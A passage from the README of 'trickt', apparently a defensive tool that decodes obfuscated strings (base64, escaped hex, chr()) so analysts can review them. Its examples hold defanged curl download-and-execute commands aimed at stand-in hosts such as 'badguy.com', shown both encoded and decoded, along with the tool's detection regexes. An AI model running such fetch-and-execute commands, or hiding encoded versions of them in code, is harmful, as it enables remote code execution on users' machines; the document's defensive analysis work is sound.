                        "OyBjdXJsIGh4eHBbOl0vL2JhZGd1eS5jb20vbWFseiA+IHJ1bm1lLnNoICYmIGNobW9kICt4IHJ1bm1lLnNoICYmIC4vcnVubWUuc2g7Cg==",
                        "ls -alh"
                ],
                "duration": 3600,
                "dict": {
                        "inner-key": "inner-value"
                }
        }
]
        |
        |--decoded_base64>  ; curl hxxp[:]//badguy.com/malz > runme.sh && chmod +x runme.sh && ./runme.sh;
```

If you find that `trickt` errors out when running with the `--pretty` switch, then you can try changing the
encoding type with the `-e` or `--encoding` switch. The default is `utf-8`. The byte string is decoded with the
value from this switch before being printed to the screen.

### Expectations when using `trickt`

Trickt is not mean to be exhaustive in its capabilities. It is meant to give analysts a quick look at a file or string
to identify common obfuscation or trickiness. For example, here are the regular expressions used to identify strings
which `trickt` should analyze further for trickiness:

```python
REGEX_CHR_STRING = br"(chr\(.+chr\([0-9]+\))"  # Pulls out all chr() strings within a single line.
REGEX_ESCAPED_CHARACTERS_STRING = br"(\\[xu].+\\[xu][0-9a-fA-F]+)"
_REGEX_B64_STRING = br"([0-9a-zA-Z\+\\]{32,}[=]{0,2})"
REGEX_URL_ENCODED = br"^.*%[0-9a-fA-F]{2}.*$"
```
As you can see... not exhaustive nor much finesse.

## Use the API

You can use the individual functions by importing `trickt`.
- Note that by using the individual deobfuscation function, you will NOT get the
recursive functionality with the current version.
- If you want the full recursive capability, use `trackt.all()` instead (see below)

```python
>>> import trickt
>>>
>>> s = br'XHg2M1x4NzVceDcyXHg2Q1x4MjBceDY4XHg3OFx4NzhceDcwXHg3M1x4M0FceDJGXHgyRlx4NzBceDYxXHg3M1x4NzRceDY1XHg2Mlx4NjlceDZFXHgyRVx4NjNceDZGXHg2RFx4MkZceDcyXHg2MVx4NzdceDJGXHg2NVx4NzNceDYzXHg2MVx4NzBceDY1XHg2NFx4NUZceDY4XHg2NVx4NzhceDVGXHg2RVx4NjVceDczXHg3NFx4NjVceDY0XHgyMFx4M0VceDIwXHg2Mlx4NjFceDY0XHg1Rlx4NjZceDY5XHg2Q1x4NjVceDJFXHg3M1x4NjhceDIwXHgyNlx4MjZceDIwXHgyRVx4MkZceDYyXHg2MVx4NjRceDVGXHg2Nlx4NjlceDZDXHg2NVx4MkVceDczXHg2OAo='
>>>
>>> result = trickt.base64_decode(s)
>>> 
>>> print(result)
[b'\\x63\\x75\\x72\\x6C\\x20\\x68\\x78\\x78\\x70\\x73\\x3A\\x2F\\x2F\\x70\\x61\\x73\\x74\\x65\\x62\\x69\\x6E\\x2E\\x63\\x6F\\x6D\\x2F\\x72\\x61\\x77\\x2F\\x65\\x73\\x63\\x61\\x70\\x65\\x64\\x5F\\x68\\x65\\x78\\x5F\\x6E\\x65\\x73\\x74\\x65\\x64\\x20\\x3E\\x20\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68\\x20\\x26\\x26\\x20\\x2E\\x2F\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68']
>>>
>>> result2 = trickt.escaped_characters(result[0])
>>>
>>>print(result2)
[b'curl hxxps://pastebin.com/raw/escaped_hex_nested > bad_file.sh && ./bad_file.sh']
```

Use `trickt.all()` to return a dictionary of all results `trickt` found to be interesting on a single string. This
includes recursive/child results.

```python
>> import json
>>
>> import trickt
>>
>> s = br'XHg2M1x4NzVceDcyXHg2Q1x4MjBceDY4XHg3OFx4NzhceDcwXHg3M1x4M0FceDJGXHgyRlx4NzBceDYxXHg3M1x4NzRceDY1XHg2Mlx4NjlceDZFXHgyRVx4NjNceDZGXHg2RFx4MkZceDcyXHg2MVx4NzdceDJGXHg2NVx4NzNceDYzXHg2MVx4NzBceDY1XHg2NFx4NUZceDY4XHg2NVx4NzhceDVGXHg2RVx4NjVceDczXHg3NFx4NjVceDY0XHgyMFx4M0VceDIwXHg2Mlx4NjFceDY0XHg1Rlx4NjZceDY5XHg2Q1x4NjVceDJFXHg3M1x4NjhceDIwXHgyNlx4MjZceDIwXHgyRVx4MkZceDYyXHg2MVx4NjRceDVGXHg2Nlx4NjlceDZDXHg2NVx4MkVceDczXHg2OAo='
>>
>> result = trickt.all(s)
>>
>> print(result)
{'url_encoded': [], 'code_point': [], 'escaped_characters': [], 'base64': [{'value': b'\\x63\\x75\\x72\\x6C\\x20\\x68\\x78\\x78\\x70\\x73\\x3A\\x2F\\x2F\\x70\\x61\\x73\\x74\\x65\\x62\\x69\\x6E\\x2E\\x63\\x6F\\x6D\\x2F\\x72\\x61\\x77\\x2F\\x65\\x73\\x63\\x61\\x70\\x65\\x64\\x5F\\x68\\x65\\x78\\x5F\\x6E\\x65\\x73\\x74\\x65\\x64\\x20\\x3E\\x20\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68\\x20\\x26\\x26\\x20\\x2E\\x2F\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68', 'depth': 0, 'child': {'url_encoded': [], 'code_point': [], 'escaped_characters': [{'value': b'curl hxxps://pastebin.com/raw/escaped_hex_nested > bad_file.sh && ./bad_file.sh', 'depth': 1, 'child': {'url_encoded': [], 'code_point': [], 'escaped_characters': [], 'base64': []}}], 'base64': []}}]}
>>>
>>> # Or, if we want to pretty it up
... 
>>> def pretty(my_dict):
...     for key, value in my_dict.items():
...         if isinstance(value, dict):
...             my_dict[key] = pretty(value)
...         if isinstance(value, list):
...             my_dict[key] = [pretty(item) for item in value]
...         if isinstance(value, bytes):
...             my_dict[key] = value.decode('utf-8')
...         continue
...     return my_dict
>>>
>>> print(json.dumps(pretty(result), indent=2))
{
  "url_encoded": [],
  "code_point": [],
  "escaped_characters": [],
  "base64": [
    {
      "value": "\\x63\\x75\\x72\\x6C\\x20\\x68\\x78\\x78\\x70\\x73\\x3A\\x2F\\x2F\\x70\\x61\\x73\\x74\\x65\\x62\\x69\\x6E\\x2E\\x63\\x6F\\x6D\\x2F\\x72\\x61\\x77\\x2F\\x65\\x73\\x63\\x61\\x70\\x65\\x64\\x5F\\x68\\x65\\x78\\x5F\\x6E\\x65\\x73\\x74\\x65\\x64\\x20\\x3E\\x20\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68\\x20\\x26\\x26\\x20\\x2E\\x2F\\x62\\x61\\x64\\x5F\\x66\\x69\\x6C\\x65\\x2E\\x73\\x68",
      "depth": 0,
      "child": {
        "url_encoded": [],
        "code_point": [],
        "escaped_characters": [
          {
            "value": "curl hxxps://pastebin.com/raw/escaped_hex_nested > bad_file.sh && ./bad_file.sh",
            "depth": 1,
            "child": {
              "url_encoded": [],
              "code_point": [],
              "escaped_characters": [],
              "base64": []
            }
          }
        ],
        "base64": []
      }
    }
  ]
}
```
